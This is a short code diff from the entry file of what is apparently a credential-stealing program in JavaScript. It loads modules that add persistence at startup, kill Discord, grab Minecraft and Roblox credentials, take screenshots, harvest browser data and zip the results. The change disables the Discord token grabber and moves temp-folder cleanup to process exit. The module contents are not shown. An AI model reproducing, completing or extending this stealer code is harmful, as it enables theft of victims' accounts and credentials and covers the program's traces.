@@ -10,7 +10,7 @@ config.addToStartup && require('./functions/startup');
 config.killDiscord  && require('./functions/kill-discord');
 require('./functions/grab-mc');
 require('./functions/grab-roblox');
-require('./functions/grab-discord-token');
+// require('./functions/grab-discord-token');
 require('./functions/screenshot');
 // require('./util/functions/fake-error');
 
@@ -40,4 +40,4 @@ browsers.forEach((browser) => {
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 sleep(1000).then(() => require('./functions/zip'));
 
-process.on('beforeExit', () => rmSync(tempFolder, { recursive: true }));
+process.on('exit', () => rmSync(tempFolder, { recursive: true }));
